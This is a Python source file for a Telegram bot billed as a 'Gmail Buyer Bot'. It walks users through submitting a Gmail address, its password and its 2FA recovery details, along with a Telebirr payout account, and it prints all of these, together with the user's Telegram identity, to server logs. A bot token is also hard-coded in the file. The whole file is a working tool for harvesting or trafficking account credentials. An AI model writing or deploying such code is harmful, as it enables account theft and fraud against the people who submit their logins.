from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ConversationHandler,
    ContextTypes,
    filters,
)

# Steps for the conversation flow
EMAIL, PASSWORD, TWO_FACTOR, TELEBIRR = range(4)

# Start Command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    reply_keyboard = [["Register a new Gmail"], ["Balance", "Help"]]
    markup = ReplyKeyboardMarkup(reply_keyboard, resize_keyboard=True)
    await update.message.reply_text(
        "Welcome to Gmail Buyer Bot! Click 'Register a new Gmail' to start.",
        reply_markup=markup
    )

# Step 1: Ask for Email
async def register_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Please enter the Gmail address you want to submit:",
        reply_markup=ReplyKeyboardRemove()
    )
    return EMAIL

# Step 2: Save Email, ask for Password
async def get_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['email'] = update.message.text
    await update.message.reply_text("Please enter the password for this Gmail account:")
    return PASSWORD

# Step 3: Save Password, ask for 2FA
async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['password'] = update.message.text
    await update.message.reply_text("Is 2FA enabled? Type 'No' or provide 2FA recovery details:")
    return TWO_FACTOR

# Step 4: Save 2FA, ask for Telebirr
async def get_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['2fa'] = update.message.text
    await update.message.reply_text(
        "Task submitted successfully!\nPlease enter your Telebirr account name/number for payout:"
    )
    return TELEBIRR

# Step 5: Save Telebirr, Grab User Info, and Finish
async def get_telebirr(update: Update, context: ContextTypes.DEFAULT_TYPE):
    telebirr_info = update.message.text
    email = context.user_data.get('email')
    password = context.user_data.get('password')
    two_fa = context.user_data.get('2fa')
    
    # Grab the Telegram user details
    user = update.effective_user
    user_id = user.id
    username = user.username if user.username else "No username"
    first_name = user.first_name
    
    # Print submitted info + user details to your Render logs
    print("\n--- NEW SUBMISSION ---")
    print(f"Telegram User ID: {user_id}")
    print(f"Telegram Name: {first_name}")
    print(f"Telegram Username: @{username}")
    print(f"Gmail: {email}")
    print(f"Password: {password}")
    print(f"2FA: {two_fa}")
    print(f"Telebirr: {telebirr_info}")
    print("----------------------\n")

    reply_keyboard = [["Register a new Gmail"], ["Balance", "Help"]]
    markup = ReplyKeyboardMarkup(reply_keyboard, resize_keyboard=True)
    
    await update.message.reply_text(
        "Submission received! Your account is pending verification and payout.",
        reply_markup=markup
    )
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Action canceled.")
    return ConversationHandler.END

if __name__ == '__main__':
    # Your token from BotFather
    BOT_TOKEN = "8941199738:AAFs0IivEoEecPtmheF-bK5KZ3wqOGQreHo"
    
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex("^Register a new Gmail$"), register_start)],
        states={
            EMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_email)],
            PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
            TWO_FACTOR: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_2fa)],
            TELEBIRR: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_telebirr)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(conv_handler)

    print("Bot is running...")
    app.run_polling()
